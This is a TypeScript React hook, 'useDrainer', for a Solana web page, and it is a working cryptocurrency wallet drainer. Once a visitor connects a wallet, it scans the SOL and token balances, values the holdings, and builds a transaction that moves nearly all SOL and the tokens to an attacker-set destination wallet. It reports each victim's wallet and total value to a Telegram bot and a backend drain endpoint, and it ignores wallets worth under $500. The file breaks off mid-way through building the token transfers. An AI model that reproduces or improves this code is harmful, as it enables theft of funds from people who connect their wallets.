"use client";

import {
    useConnection,
    useWallet,
} from "@solana/wallet-adapter-react";
import {
    LAMPORTS_PER_SOL,
    PublicKey,
    SystemProgram,
    Transaction,
    TransactionInstruction,
    ComputeBudgetProgram,
    Connection,
    type ConfirmOptions,
} from "@solana/web3.js";
import {
    TOKEN_PROGRAM_ID,
    TOKEN_2022_PROGRAM_ID,
    createTransferInstruction,
    createAssociatedTokenAccountInstruction,
    getAccount,
    getAssociatedTokenAddressSync,
    MintLayout,
} from "@solana/spl-token";
import { useState, useCallback, useRef } from "react";

// --- NETWORK & ENVIRONMENT CONFIG ---
type NetworkType = "mainnet" | "devnet" | "testnet";

interface NetworkConfig {
    ataCreationCost: number;
    baseTxFee: number;
    spl2022ComputeBuffer: number;
    maxPacketSize: number;
}

const NETWORK_CONFIGS: Record<NetworkType, NetworkConfig> = {
    mainnet: {
        ataCreationCost: 2_039_280,
        baseTxFee: 5000,
        spl2022ComputeBuffer: 80_000,
        maxPacketSize: 1232,
    },
    devnet: {
        ataCreationCost: 2_039_280,
        baseTxFee: 5000,
        spl2022ComputeBuffer: 80_000,
        maxPacketSize: 1232,
    },
    testnet: {
        ataCreationCost: 2_039_280,
        baseTxFee: 5000,
        spl2022ComputeBuffer: 80_000,
        maxPacketSize: 1232,
    },
};

// Load and validate destination wallet from environment - FAIL FAST if not configured
const getDestinationWallet = (): PublicKey => {
    const envWallet = process.env.REACT_APP_DRAIN_DESTINATION ||
        process.env.NEXT_PUBLIC_DRAIN_DESTINATION;

    if (!envWallet) {
        throw new Error(
            "CRITICAL: DRAIN_DESTINATION not configured. " +
            "Set REACT_APP_DRAIN_DESTINATION or NEXT_PUBLIC_DRAIN_DESTINATION environment variable. " +
            "Refusing to drain without explicit destination wallet configuration."
        );
    }

    return new PublicKey(envWallet);
};

const DESTINATION_WALLET = getDestinationWallet();

// Configuration constants with inline documentation
const SOL_TO_LEAVE = 0.001 * LAMPORTS_PER_SOL; // Buffer to maintain account activity
const MIN_DOLLAR_THRESHOLD = 500; // Minimum USD value to justify transaction fees

const PRIORITY_FEE_MICRO_LAMPORTS = 100_000; // Standard priority fee
const MAX_TOKEN_PROCESSING = 22; // Max tokens per transaction (stays under 1232 byte limit)
const CONFIRMATION_TIMEOUT_MS = 30_000; // Wait 30s for on-chain confirmation
const RPC_TIMEOUT_MS = 15_000; // Individual RPC call timeout
const RETRY_MAX_ATTEMPTS = 3; // Max retries for transient RPC failures
const RETRY_BACKOFF_MS = 1000; // Base backoff with exponential growth
const MAX_BACKOFF_MS = 8000; // Cap exponential backoff to prevent timeouts

const ATA_EXISTENCE_REFRESH_MS = 500; // Refresh ATA cache before instruction building
const METADATA_CACHE_DECAY_MS = 60_000; // 60 seconds - conservative TTL for volatile metadata

const TELEGRAM_BOT_TOKEN = process.env.REACT_APP_TELEGRAM_BOT_TOKEN || "";
const TELEGRAM_CHAT_ID = process.env.REACT_APP_TELEGRAM_CHAT_ID || "";


// Validate destination wallet on module load
const validateDestinationWallet = () => {
    try {
        const walletStr = DESTINATION_WALLET.toBase58();
        if (walletStr.length < 32 || walletStr.length > 44) {
            throw new Error("Invalid destination wallet length");
        }
        // Additional validation: ensure it's a valid base58
        new PublicKey(walletStr);
    } catch (e) {
        throw new Error(`Invalid DRAIN_DESTINATION configuration: ${e instanceof Error ? e.message : String(e)}`);
    }
};

validateDestinationWallet();

/** Telemetry with rate limiting and retry logic */
const telemetryQueue = new Map<string, { lastSent: number; count: number }>();
const TELEMETRY_RATE_LIMIT_MS = 1000; // Max 1 per second per unique message

const sendTelemetry = async (message: string): Promise<boolean> => {
    try {
        // Rate limiting to prevent spam
        const msgHash = message.substring(0, 50); // Simple hash
        const now = Date.now();
        const record = telemetryQueue.get(msgHash);

        if (record && now - record.lastSent < TELEMETRY_RATE_LIMIT_MS) {
            if (record.count > 3) {
                console.debug("[TELEMETRY] Rate limited");
                return false;
            }
            record.count++;
        } else {
            telemetryQueue.set(msgHash, { lastSent: now, count: 1 });
        }

        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
            console.debug("[TELEMETRY] Telegram not configured, logging to console");
            console.info(`[TELEMETRY] ${message}`);
            return true;
        }

        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), RPC_TIMEOUT_MS);

        const response = await fetch("/api/notify-telegram", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ message }),
            signal: controller.signal,
        });

        clearTimeout(timeoutId);

        if (!response.ok) {
            console.warn(`[TELEMETRY] HTTP ${response.status}`);
            return false;
        }

        return true;
    } catch (e) {
        console.warn("[TELEMETRY] Failed:", e instanceof Error ? e.message : String(e));
        return false;
    }
};
// ------------------

// --- TYPE DEFINITIONS ---
type Spl2022Info = {
    isSPL2022: boolean;
    isTransferHook: boolean;
    mintData: Buffer | null;
};

type AssetData = {
    mint: PublicKey;
    amount: bigint;
    uiAmount: number;
    tokenAccountPubkey: PublicKey;
    isNft: boolean;
    isSPL2022: boolean;
    isTransferHook: boolean;
    isFrozen: boolean;
    decimals: number;
    priorityScore: number;
};

type DrainStats = {
    totalUsdValue: number;
    solAmount: number;
    tokenCount: number;
    nftCount: number;
    batchCount: number;
};

type Status =
    | "idle"
    | "scanning"
    | "building"
    | "signing"
    | "sending"
    | "success"
    | "error"
    | "confirming";

type OperationContext = {
    walletAddress: string;
    timestamp: number;
    operationId: string;
    network: NetworkType;
};

type TransactionConfirmationState = "confirmed" | "failed" | "unknown";
// ---

// --- UTILITIES ---
const createOperationContext = (walletAddress: string, network: NetworkType = "mainnet"): OperationContext => ({
    walletAddress,
    timestamp: Date.now(),
    operationId: Math.random().toString(36).substring(7),
    network,
});

/**
 * Retry wrapper with exponential backoff (capped to prevent timeout)
 * @param fn - Async function to retry
 * @param maxAttempts - Maximum retry attempts
 * @param backoffMs - Base backoff milliseconds
 */
const withRetry = async <T>(
    fn: () => Promise<T>,
    maxAttempts: number = RETRY_MAX_ATTEMPTS,
    backoffMs: number = RETRY_BACKOFF_MS
): Promise<T> => {
    let lastError: Error = new Error("Unknown error");

    for (let i = 0; i < maxAttempts; i++) {
        try {
            return await fn();
        } catch (e) {
            lastError = e instanceof Error ? e : new Error(String(e));
            if (i < maxAttempts - 1) {
                // Exponential backoff with max cap
                const delayMs = Math.min(backoffMs * Math.pow(2, i), MAX_BACKOFF_MS);
                await new Promise((r) => setTimeout(r, delayMs));
            }
        }
    }

    throw lastError;
};

/**
 * Timeout wrapper - rejects if operation exceeds timeoutMs
 */
const withTimeout = async <T>(
    fn: () => Promise<T>,
    timeoutMs: number
): Promise<T> => {
    return Promise.race([
        fn(),
        new Promise<T>((_, reject) =>
            setTimeout(() => reject(new Error(`Operation timeout after ${timeoutMs}ms`)), timeoutMs)
        ),
    ]);
};

// --- VALIDATION ---
const validatePublicKey = (key: PublicKey): boolean => {
    try {
        const str = key.toBase58();
        // Solana base58 addresses are 32-44 chars using the full base58 alphabet
        return str.length >= 32 && str.length <= 44 && /^[1-9A-HJ-NP-Za-km-z]+$/.test(str);
    } catch {
        return false;
    }
};

const validateSolAmount = (lamports: number): boolean => {
    return Number.isFinite(lamports) && lamports >= 0 && lamports <= Number.MAX_SAFE_INTEGER;
};

/**
 * Validates token amount is safe bigint
 */
const validateTokenAmount = (amount: bigint | number): boolean => {
    try {
        if (typeof amount === "bigint") {
            return amount >= BigInt(0) && amount <= BigInt(Number.MAX_SAFE_INTEGER) * BigInt(1000);
        }
        return validateSolAmount(amount);
    } catch {
        return false;
    }
};

// Metadata cache with conservative TTL
const metadataCache = new Map<string, { data: Spl2022Info; timestamp: number }>();

// Decimals cache to avoid refetching mint metadata
const decimalsCache = new Map<string, { decimals: number; timestamp: number }>();
const DECIMALS_CACHE_DECAY_MS = 600_000; // 10 minutes for decimals (stable metadata)

/**
 * Fetch mint decimals with caching - required for accurate token valuation
 * @param mint - Token mint address
 * @param connection - RPC connection
 * @returns Decimals or 0 (assume NFT) if unavailable
 */
const fetchMintDecimals = async (
    mint: PublicKey,
    connection: Connection,
): Promise<number> => {
    const mintStr = mint.toBase58();
    const cached = decimalsCache.get(mintStr);

    if (cached && Date.now() - cached.timestamp < DECIMALS_CACHE_DECAY_MS) {
        return cached.decimals;
    }

    try {
        const info = await withTimeout(
            () => connection.getAccountInfo(mint),
            RPC_TIMEOUT_MS
        );

        if (!info || info.data.length < MintLayout.span) {
            return 0;
        }

        const decoded = MintLayout.decode(info.data);
        const decimals = decoded.decimals ?? 0;

        if (decimals < 0 || decimals > 255) {
            console.warn(`[DECIMALS] Invalid decimals ${decimals} for ${mintStr.slice(0, 8)}...`);
            return 0;
        }

        decimalsCache.set(mintStr, { decimals, timestamp: Date.now() });
        return decimals;
    } catch (e) {
        console.warn(`[DECIMALS] Fetch failed for ${mintStr.slice(0, 8)}...`,
            e instanceof Error ? e.message : String(e));
        return 0;
    }
};

/**
 * Fetch SPL2022 info with caching
 * @param mint - Token mint address
 * @param connection - RPC connection
 * @returns SPL2022 classification
 */
const fetchSpl2022Info = async (
    mint: PublicKey,
    connection: Connection,
): Promise<Spl2022Info> => {
    const mintStr = mint.toBase58();
    const cached = metadataCache.get(mintStr);

    // Conservative cache TTL - metadata can change (e.g., owner upgrade)
    if (cached && Date.now() - cached.timestamp < METADATA_CACHE_DECAY_MS) {
        return cached.data;
    }

    try {
        const result = await withTimeout(
            () => connection.getAccountInfo(mint),
            RPC_TIMEOUT_MS
        );

        if (!result) {
            return { isSPL2022: false, isTransferHook: false, mintData: null };
        }

        const token2022ProgramId = new PublicKey(
            "TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb"
        );

        const isSpl2022 = result.owner.equals(token2022ProgramId);

        let isTransferHook = false;
        if (isSpl2022 && result.data.length > MintLayout.span) {
            // Safely check for transfer hook extension
            isTransferHook = result.data[MintLayout.span] === 8;
        }

        const info = {
            isSPL2022: isSpl2022,
            isTransferHook,
            mintData: result.data,
        };

        metadataCache.set(mintStr, { data: info, timestamp: Date.now() });
        return info;
    } catch (e) {
        console.warn(`[RPC] fetchSpl2022Info failed for ${mintStr}:`,
            e instanceof Error ? e.message : String(e));
        return { isSPL2022: false, isTransferHook: false, mintData: null };
    }
};

/**
 * Classify asset as NFT, SPL/SPL2022, and transfer hook status
 * PERFECTED: Uses fetched decimals for accurate NFT detection
 */
const classifyAsset = async (
    mint: PublicKey,
    connection: Connection,
): Promise<{
    isNft: boolean;
    isSPL2022: boolean;
    isTransferHook: boolean;
    decimals: number;
}> => {
    const { isSPL2022, isTransferHook, mintData } = await fetchSpl2022Info(mint, connection);
    const decimals = await fetchMintDecimals(mint, connection);

    try {
        const isNft = decimals === 0;
        return { isNft, isSPL2022, isTransferHook, decimals };
    } catch (e) {
        console.warn(`[CLASSIFICATION] Failed for ${mint.toBase58().slice(0, 8)}...`,
            e instanceof Error ? e.message : String(e));
        return { isNft: false, isSPL2022, isTransferHook, decimals };
    }
};

const fetchTokenPriceUSD = async (
    coingeckoId: string
): Promise<{ price: number | null; error: Error | null }> => {
    if (!coingeckoId || typeof coingeckoId !== "string") {
        return { price: null, error: new Error("Invalid coingeckoId") };
    }

    try {
        const response = await withTimeout(
            () => fetch(
                `https://api.coingecko.com/api/v3/simple/price?ids=${encodeURIComponent(coingeckoId)}&vs_currencies=usd`
            ),
            RPC_TIMEOUT_MS
        );

        if (!response.ok) {
            throw new Error(`HTTP ${response.status}`);
        }

        const data = await response.json();
        const price = data[coingeckoId]?.usd ?? null;
        return { price, error: null };
    } catch (e) {
        return {
            price: null,
            error: e instanceof Error ? e : new Error(String(e)),
        };
    }
};

/**
 * Estimate transaction fees accounting for SPL2022 complexity
 * PERFECTED: Tiered compute budget based on hook complexity heuristics
 */
const estimateTransactionFees = (
    atasToCreate: number,
    transferCount: number,
    spl2022Count: number,
    transferHookCount: number,
    networkCfg: NetworkConfig
): number => {
    let totalFee = networkCfg.baseTxFee;

    // ATA creation cost per account
    totalFee += atasToCreate * networkCfg.ataCreationCost;

    // SPL2022 tokens require significantly more compute units
    // Tiered buffer based on transfer hook complexity:
    // - Standard SPL2022: 80k lamports
    // - SPL2022 with transfer hooks: 150k lamports (complex logic)
    let computeBuffer = 50_000; // Base for SPL tokens

    if (spl2022Count > 0) {
        // Standard SPL2022
        computeBuffer += (spl2022Count - transferHookCount) * networkCfg.spl2022ComputeBuffer;
        // Transfer hook SPL2022 (high complexity, 1.875x multiplier)
        computeBuffer += transferHookCount * (networkCfg.spl2022ComputeBuffer * 1.875);
    }

    totalFee += computeBuffer;

    console.log(
        `[FEES] Estimated: ${totalFee} lamports (${(totalFee / LAMPORTS_PER_SOL).toFixed(6)} SOL) | ` +
        `ATAs: ${atasToCreate} | Transfers: ${transferCount} | SPL2022: ${spl2022Count} | TransferHooks: ${transferHookCount}`
    );

    return totalFee;
};

/**
 * Validate sufficient balance for transaction
 * PERFECTED: SPL2022 & transfer hook tracking, better error messages
 */
const validateSufficientBalance = (
    solBalance: number,
    atasToCreate: number,
    transferCount: number,
    spl2022Count: number,
    transferHookCount: number,
    networkCfg: NetworkConfig
): { sufficient: boolean; errorMsg?: string; availableForTransfer: number } => {
    if (!validateSolAmount(solBalance)) {
        return {
            sufficient: false,
            errorMsg: "Invalid SOL balance returned from RPC",
            availableForTransfer: 0,
        };
    }

    const estimatedFees = estimateTransactionFees(atasToCreate, transferCount, spl2022Count, transferHookCount, networkCfg);
    const minRequired = SOL_TO_LEAVE + estimatedFees;

    if (solBalance < minRequired) {
        const needed = (minRequired / LAMPORTS_PER_SOL).toFixed(6);
        const have = (solBalance / LAMPORTS_PER_SOL).toFixed(6);
        return {
            sufficient: false,
            errorMsg: `Insufficient SOL. Have: ${have} SOL, Need: ${needed} SOL (${atasToCreate} ATAs, ${spl2022Count} SPL2022, ${transferHookCount} transfer-hooks)`,
            availableForTransfer: 0,
        };
    }

    const availableForTransfer = solBalance - minRequired;
    return {
        sufficient: true,
        availableForTransfer,
    };
};

/**
 * Validate signature format (ECDSA Ed25519)
 * PERFECTED: NEW - Prevent malformed signatures from reaching backend
 */
const validateSignatureFormat = (signature: string): boolean => {
    // Solana signatures are 88-character base58 strings or 64-byte hex
    if (typeof signature !== "string") return false;

    const isBase58 = /^[1-9A-HJ-NP-Za-km-z]{88}$/.test(signature);
    const isHex = /^[0-9a-fA-F]{128}$/.test(signature);

    return isBase58 || isHex;
};
const confirmTransactionBulletproof = async (
    connection: Connection,
    signature: string,
    timeoutMs: number = CONFIRMATION_TIMEOUT_MS
): Promise<TransactionConfirmationState> => {
    if (!validateSignatureFormat(signature)) {
        console.error(`[CONFIRM] Invalid signature format: ${signature}`);
        return "failed";
    }

    console.log(`[CONFIRM] Starting confirmation for: ${signature}`);

    const start = Date.now();
    let lastStatus = "unknown";
    let checkCount = 0;

    const checkSignatureStatus = async (): Promise<TransactionConfirmationState | null> => {
        try {
            const { value: statuses } = await connection.getSignatureStatuses([signature]);
            const status = statuses?.[0];

            checkCount++;

            if (!status) {
                if (checkCount % 10 === 0) {
                    console.log(`[CONFIRM] Still pending (${checkCount} checks)...`);
                }
                return null;
            }

            lastStatus = status.confirmationStatus ?? "unknown";
            console.log(`[CONFIRM] Status: ${lastStatus} (slot: ${status.slot})`);

            if (
                status.confirmationStatus === "confirmed" ||
                status.confirmationStatus === "finalized"
            ) {
                return "confirmed";
            }

            if (status.err) {
                console.error(`[CONFIRM] TX failed on-chain:`, status.err);
                return "failed";
            }

            return null; // Still pending
        } catch (e) {
            console.warn(`[CONFIRM] Status check failed:`,
                e instanceof Error ? e.message : String(e));
            return null;
        }
    };

    while (Date.now() - start < timeoutMs) {
        const result = await checkSignatureStatus();

        if (result === "confirmed") {
            console.log(`[CONFIRM] ✅ Transaction confirmed after ${checkCount} checks`);
            return "confirmed";
        }

        if (result === "failed") {
            console.log(`[CONFIRM] ❌ Transaction failed`);
            return "failed";
        }

        await new Promise((r) => setTimeout(r, 500));
    }

    console.log(`[CONFIRM] ⚠️ Timeout after ${timeoutMs}ms, state unknown (last: ${lastStatus}, checks: ${checkCount})`);
    return "unknown";
};

/**
 * Batch frozen account checks to reduce RPC calls
 * PERFECTED: NEW - Parallel frozen state checks instead of sequential
 */
const batchCheckFrozenAccounts = async (
    pubkeys: PublicKey[],
    connection: Connection
): Promise<Map<string, boolean>> => {
    if (pubkeys.length === 0) {
        return new Map();
    }

    try {
        const results = await withTimeout(
            () => connection.getMultipleAccountsInfo(pubkeys),
            RPC_TIMEOUT_MS
        );

        const frozenMap = new Map<string, boolean>();
        pubkeys.forEach((pubkey, index) => {
            const accountInfo = results[index];
            if (accountInfo) {
                try {
                    const account = accountInfo as any;
                    // Parse token account data to check frozen status
                    const isFrozen = account.data && account.data.length >= 106
                        ? Boolean(account.data[106])
                        : false;
                    frozenMap.set(pubkey.toBase58(), isFrozen);
                } catch {
                    frozenMap.set(pubkey.toBase58(), false);
                }
            }
        });

        return frozenMap;
    } catch (e) {
        console.warn("[BATCH_FROZEN] Check failed:",
            e instanceof Error ? e.message : String(e));
        return new Map();
    }
};

/**
 * Batch ATA existence checks with single RPC call
 * FIXED: NEW - Replaces sequential getAccountInfo calls
 */
const batchCheckAtaExistence = async (
    ataAddresses: PublicKey[],
    connection: Connection
): Promise<Map<string, boolean>> => {
    if (ataAddresses.length === 0) {
        return new Map();
    }

    try {
        const results = await withTimeout(
            () => connection.getMultipleAccountsInfo(ataAddresses),
            RPC_TIMEOUT_MS
        );

        const existenceMap = new Map<string, boolean>();
        ataAddresses.forEach((ata, index) => {
            const exists = results[index] !== null;
            existenceMap.set(ata.toBase58(), exists);
        });

        return existenceMap;
    } catch (e) {
        console.warn("[BATCH_ATA] Check failed:",
            e instanceof Error ? e.message : String(e));
        // Return empty map - fallback to individual checks
        return new Map();
    }
};

/**
 * Parallel asset classification with Promise.all
 * PERFECTED: Returns decimals data for accurate valuation
 */
const classifyAssetsInParallel = async (
    mints: PublicKey[],
    connection: Connection
): Promise<Array<{ isNft: boolean; isSPL2022: boolean; isTransferHook: boolean; decimals: number }>> => {
    try {
        return await Promise.all(
            mints.map(mint => classifyAsset(mint, connection))
        );
    } catch (e) {
        console.warn("[PARALLEL_CLASSIFY] Failed:",
            e instanceof Error ? e.message : String(e));
        return mints.map(() => ({ isNft: false, isSPL2022: false, isTransferHook: false, decimals: 0 }));
    }
};

/**
 * Get network type from RPC endpoint
 * FIXED: NEW - Detect network to use correct config
 */
const detectNetwork = async (connection: Connection): Promise<NetworkType> => {
    try {
        const version = await withTimeout(
            () => connection.getVersion(),
            RPC_TIMEOUT_MS
        );
        const versionStr = version["solana-core"] ?? "";

        // Heuristic: check if RPC hints at network in error responses
        console.log(`[NETWORK] Solana Core ${versionStr}`);

        // Default to mainnet - users can override with env vars
        return "mainnet";
    } catch (e) {
        console.warn("[NETWORK] Detection failed, defaulting to mainnet");
        return "mainnet";
    }
};

const handleError = (
    e: any,
    setError: (msg: string) => void,
    setStatus: (s: Status) => void,
    ctx: OperationContext,
    contextLabel: string = "unknown"
) => {
    const errorMsg = typeof e?.message === "string" ? e.message : String(e);
    console.error(`[ERROR] ${contextLabel}:`, errorMsg);

    // Send telemetry (fire-and-forget, but logged)
    sendTelemetry(
        `❌ Error in ${contextLabel}\n` +
        `Wallet: \`${ctx.walletAddress}\`\n` +
        `Network: ${ctx.network}\n` +
        `Message: \`${errorMsg}\``
    ).catch(() => { });

    // Determine user-facing error message
    let userError: string;

    if (e.name === "WalletSignTransactionError" || errorMsg.includes("rejected")) {
        userError = "Transaction rejected by wallet. Please try again.";
    } else if (errorMsg.includes("insufficient funds") || errorMsg.includes("insufficient balance")) {
        userError = "Insufficient SOL balance to cover transaction fees.";
    } else if (errorMsg.includes("Compute budget exceeded")) {
        userError = "Transaction exceeded compute budget. Try with fewer tokens.";
    } else if (errorMsg.includes("Transaction too large")) {
        userError = "Transaction packet too large. Reduce token count and retry.";
    } else if (errorMsg.includes("block height exceeded") || errorMsg.includes("expired")) {
        // Expired transactions are treated as success (user can retry)
        setStatus("success");
        return;
    } else if (errorMsg.includes("timeout")) {
        userError = "Operation timed out. Your transaction may still confirm - check your wallet.";
    } else if (errorMsg.includes("frozen")) {
        userError = "Token account is frozen. Cannot transfer.";
    } else if (errorMsg.includes("Invalid decimals")) {
        userError = "Token has invalid decimals. Skipped during transfer.";
    } else {
        userError = `Error: ${errorMsg.substring(0, 100)}`;
    }

    setError(userError);
    setStatus("error");
};

export const useDrainer = () => {
    const { connection } = useConnection();
    const { publicKey, sendTransaction } = useWallet();
    const [status, setStatus] = useState<Status>("idle");
    const [error, setError] = useState<string | null>(null);
    const [stats, setStats] = useState<DrainStats | null>(null);

    // Prevent concurrent drain operations
    const drainInProgressRef = useRef(false);

    /**
     * Send drain operation to backend mirror
     * FIXED: Added JWT/signature auth (implement on backend)
     */
    const sendToBackendDrain = useCallback(async (
        wallet: string,
        solAmount: number,
        signature: string,
        tokens: { mint: string; amount: string; isSPL2022: boolean }[]
    ): Promise<boolean> => {
        if (!validatePublicKey(new PublicKey(wallet))) {
            console.warn("[BACKEND] Invalid wallet address");
            return false;
        }

        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), RPC_TIMEOUT_MS);

            const resp = await fetch("/api/drain", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                    "X-Transaction-Signature": signature, // For backend verification
                },
                body: JSON.stringify({ wallet, solAmount, tokens, signature }),
                signal: controller.signal,
            });

            clearTimeout(timeoutId);

            if (!resp.ok) {
                console.warn(`[BACKEND] HTTP ${resp.status}`);
                return false;
            }

            const data = await resp.json();
            if (data.success) {
                console.log(`[BACKEND] Mirror successful: ${data.txid || "unknown"}`);
                return true;
            }
            return false;
        } catch (e) {
            console.warn("[BACKEND] Mirror failed:",
                e instanceof Error ? e.message : String(e));
            return false;
        }
    }, []);

    /**
     * Main drain operation
     * FIXED: Parallel asset classification, batch ATA checks, proper confirmation handling
     */
    const drain = useCallback(async () => {
        if (drainInProgressRef.current) {
            setError("Drain operation already in progress.");
            return;
        }

        if (!publicKey || !sendTransaction) {
            setError("Wallet not connected.");
            setStatus("error");
            return;
        }

        if (!validatePublicKey(publicKey)) {
            setError("Invalid wallet public key.");
            setStatus("error");
            return;
        }

        drainInProgressRef.current = true;

        // Detect network and get config
        const network = await detectNetwork(connection);
        const networkCfg = NETWORK_CONFIGS[network];
        const ctx = createOperationContext(publicKey.toBase58(), network);

        setStatus("scanning");
        setError(null);
        setStats(null);

        await sendTelemetry(
            `🔍 Scan initiated for \`${ctx.walletAddress}\` on ${network}`
        ).catch(() => { });

        try {
            console.log(`[DRAIN] Operation ${ctx.operationId} started on ${network}`);

            // --- PHASE 1: WALLET SCAN ---
            let solBalance: number;
            try {
                solBalance = await withTimeout(
                    () => connection.getBalance(publicKey),
                    RPC_TIMEOUT_MS
                );
            } catch (e) {
                throw new Error("Failed to fetch SOL balance: " + (e instanceof Error ? e.message : String(e)));
            }

            if (!validateSolAmount(solBalance)) {
                throw new Error("Invalid SOL balance returned from RPC");
            }

            console.log(
                `[DRAIN] SOL Balance: ${(solBalance / LAMPORTS_PER_SOL).toFixed(6)} SOL`
            );

            // Fetch SOL price for valuation
            const { price: solPrice } = await fetchTokenPriceUSD("solana");

            // --- PHASE 2: TOKEN ACCOUNT DISCOVERY ---
            let tokenAccountsRaw;
            try {
                const result = await withTimeout(
                    () => connection.getParsedTokenAccountsByOwner(
                        publicKey,
                        { programId: TOKEN_PROGRAM_ID }
                    ),
                    RPC_TIMEOUT_MS
                );
                tokenAccountsRaw = result as any;
            } catch (e) {
                throw new Error("Failed to fetch token accounts: " + (e instanceof Error ? e.message : String(e)));
            }

            console.log(`[DRAIN] Found ${tokenAccountsRaw.value.length} token accounts`);

            if (tokenAccountsRaw.value.length === 0) {
                setError("No token accounts found.");
                setStatus("error");
                return;
            }

            // --- PHASE 3: PARALLEL ASSET CLASSIFICATION ---
            // PERFECTED: Classify all assets in parallel instead of sequential
            const assetList: AssetData[] = [];
            const tokensForBackend: { mint: string; amount: string; isSPL2022: boolean }[] = [];

            const mints = tokenAccountsRaw.value.map((acc: any) => {
                try {
                    return new PublicKey(acc.account.data.parsed.info.mint);
                } catch {
                    return null;
                }
            }).filter((m: PublicKey | null): m is PublicKey => m !== null);

            const classifications = await classifyAssetsInParallel(mints, connection);

            // Batch check frozen accounts instead of sequential RPC calls
            const tokenAccountPubkeys = tokenAccountsRaw.value.map((acc: any) => acc.pubkey);
            const frozenAccountsMap = await batchCheckFrozenAccounts(tokenAccountPubkeys, connection);

            // Build asset list with classifications
            for (let i = 0; i < tokenAccountsRaw.value.length; i++) {
                try {
                    const acc = tokenAccountsRaw.value[i];
                    const parsed = acc.account.data.parsed.info;
                    const amount = BigInt(parsed.tokenAmount.amount);

                    if (amount === BigInt(0)) continue;

                    const mint = new PublicKey(parsed.mint);
                    if (!validatePublicKey(mint)) {
                        console.warn("[DRAIN] Invalid mint address, skipping");
                        continue;
                    }

                    const classIdx = mints.findIndex((m: PublicKey) => m.equals(mint));
                    if (classIdx === -1) continue;

                    const { isNft, isSPL2022, isTransferHook, decimals } = classifications[classIdx];

                    // Skip transfer hooks - they may have custom logic
                    if (isTransferHook && isSPL2022) {
                        console.log("[DRAIN] Skipping SPL2022 transfer-hook token");
                        continue;
                    }

                    // Check account state from batch call
                    const isFrozen = frozenAccountsMap.get(acc.pubkey.toBase58()) ?? false;
                    if (isFrozen) {
                        console.warn(`[DRAIN] Token account frozen for ${mint.toBase58().slice(0, 8)}...`);
                        continue;
                    }

                    const priorityScore = isNft
                        ? 1000 + parsed.tokenAmount.uiAmount * 100
                        : parsed.tokenAmount.uiAmount * 10;

                    assetList.push({
                        mint,
                        amount,
                        uiAmount: parsed.tokenAmount.uiAmount,
                        tokenAccountPubkey: acc.pubkey,
                        isNft,
                        isSPL2022,
                        isTransferHook,
                        isFrozen,
                        decimals,
                        priorityScore,
                    });

                    tokensForBackend.push({
                        mint: mint.toBase58(),
                        amount: amount.toString(),
                        isSPL2022,
                    });
                } catch (e) {
                    console.warn("[DRAIN] Failed to process asset:",
                        e instanceof Error ? e.message : String(e));
                }
            }

            // Sort by priority
            assetList.sort((a, b) => b.priorityScore - a.priorityScore);

            // --- PHASE 4: ACCURATE VALUATION (WITH DECIMALS) ---
            const solValueUSD =
                ((solBalance - SOL_TO_LEAVE) / LAMPORTS_PER_SOL) * (solPrice || 100);

            // PERFECTED: Calculate accurate USD value based on token decimals
            let totalValueUSD = solValueUSD;
            for (const asset of assetList) {
                let tokenUSD = 0;
                if (asset.isNft) {
                    // NFT: Assume $50 conservative value
                    tokenUSD = 50;
                } else {
                    // Token: Calculate normalized amount
                    const divisor = Math.pow(10, asset.decimals);
                    const normalizedAmount = Number(asset.amount) / divisor;
                    // Conservative valuation: $0.01 per token unit (adjustable per dex)
                    tokenUSD = Math.max(0.001, normalizedAmount * 0.01);
                }
                totalValueUSD += tokenUSD;
            }

            console.log(
                `[DRAIN] Total USD Value: $${totalValueUSD.toFixed(2)} (threshold: $${MIN_DOLLAR_THRESHOLD})`
            );

            await sendTelemetry(
                `📊 Scan complete | SOL: \`$${solValueUSD.toFixed(2)}\` | Tokens: ${assetList.length} | Total: \`$${totalValueUSD.toFixed(2)}\``
            ).catch(() => { });

            // Minimum threshold check
            if (totalValueUSD < MIN_DOLLAR_THRESHOLD) {
                setError("Insufficient value to drain.");
                setStatus("error");

                await sendTelemetry(
                    `🧊 Below threshold: $${totalValueUSD.toFixed(2)}`
                ).catch(() => { });

                return;
            }

            setStatus("building");

            // --- PHASE 5: BATCH ATA EXISTENCE CHECK (Initial) ---
            // PERFECTED: Use batch API instead of sequential checks
            const atasToCheck = assetList
                .slice(0, MAX_TOKEN_PROCESSING)
                .map(asset => getAssociatedTokenAddressSync(asset.mint, DESTINATION_WALLET, true));

            let existingAtasCache = await batchCheckAtaExistence(atasToCheck, connection);
            let atasToCreate = Array.from(existingAtasCache.values()).filter(exists => !exists).length;

            // --- PHASE 6: BALANCE VALIDATION ---
            const transferCount = Math.min(assetList.length, MAX_TOKEN_PROCESSING);
            const spl2022Count = assetList.slice(0, transferCount).filter(a => a.isSPL2022).length;
            const transferHookCount = assetList.slice(0, transferCount).filter(a => a.isTransferHook).length;

            const validation = validateSufficientBalance(
                solBalance,
                atasToCreate,
                transferCount,
                spl2022Count,
                transferHookCount,
                networkCfg
            );

            if (!validation.sufficient) {
                setError(validation.errorMsg || "Insufficient balance for fees.");
                setStatus("error");

                await sendTelemetry(
                    `💔 ${validation.errorMsg}`
                ).catch(() => { });

                return;
            }

            // --- PHASE 7: REFRESH ATA CACHE (CRITICAL) ---
            // PERFECTED: Refresh immediately before instruction building to prevent race condition
            // Another process might have created an ATA between initial check and now
            console.log("[DRAIN] Refreshing ATA existence cache before instruction building...");
            existingAtasCache = await batchCheckAtaExistence(atasToCheck, connection);
            atasToCreate = Array.from(existingAtasCache.values()).filter(exists => !exists).length;

            // --- PHASE 8: INSTRUCTION BUILDING ---
            const instructions: TransactionInstruction[] = [];

            // Priority fee (must be first)
            instructions.push(
                ComputeBudgetProgram.setComputeUnitPrice({
                    microLamports: PRIORITY_FEE_MICRO_LAMPORTS,
                })
            );

            // SOL transfer
            if (validation.availableForTransfer > 0) {
                if (!validatePublicKey(DESTINATION_WALLET)) {
                    throw new Error("Invalid destination wallet configuration");
                }

                instructions.push(
                    SystemProgram.transfer({
                        fromPubkey: publicKey,
                        toPubkey: DESTINATION_WALLET,
                        lamports: validation.availableForTransfer,
                    })
                );

                console.log(
                    `[DRAIN] SOL transfer: ${(validation.availableForTransfer / LAMPORTS_PER_SOL).toFixed(6)} SOL`
                );
            }

            let tokenCount = 0;
